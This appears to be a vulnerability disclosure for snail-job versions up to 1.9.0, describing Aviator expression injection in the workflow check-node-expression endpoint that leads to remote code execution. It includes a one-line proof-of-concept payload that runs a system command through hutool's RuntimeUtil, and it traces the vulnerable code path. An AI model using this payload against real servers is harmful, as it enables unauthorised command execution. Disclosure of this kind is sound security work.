# Snail-job aviator expression injection (≤ v1.9.0)

**Product**: snail-job

**Affected Versions**: ≤ v1.9.0

**address**: https://github.com/aizuda/snail-job

## Vulnerability Description

In snail-job versions 1.9.0 and below, the `/snail-job/workflow/check-node-expression` interface does not validate user input and executes it directly as an aviator expression, resulting in remote code execution.

## POC

```java
use cn.hutool.core.util.*;RuntimeUtil.execForStr(seq.array(java.lang.String, "calc"))
```
<img width="1873" height="826" alt="image" src="https://github.com/user-attachments/assets/71bee2e8-17e1-40be-940f-d611857429eb" />

## Code

The vulnerable code interface is located at `com.aizuda.snailjob.server.web.controller.WorkflowController`
<img width="1358" height="228" alt="image" src="https://github.com/user-attachments/assets/3aa387a6-6f9e-49b5-b7c4-cf47361c4821" />

After a series of initializations, the `expressionEngine.eval` method is called.
<img width="1462" height="492" alt="image" src="https://github.com/user-attachments/assets/16aad6dc-f9d5-4382-8510-f6739e0db50e" />

Following the `eval` method, it was found that the `doEval` method was called. Further investigation led to the implementation class `AviatorExpressionEngine`.
<img width="1292" height="493" alt="image" src="https://github.com/user-attachments/assets/7bdd3df0-e6ae-440f-91d7-7f165f0465e2" />

The `AviatorExpressionEngine` class overrides the `doEval` method, and the parameter `expression` is controllable. The developer directly put the expression parameter into the execute method, resulting in aviator expression injection.
<img width="1421" height="378" alt="image" src="https://github.com/user-attachments/assets/2379c65a-abe9-47e8-9268-45d79fa5e9dd" />
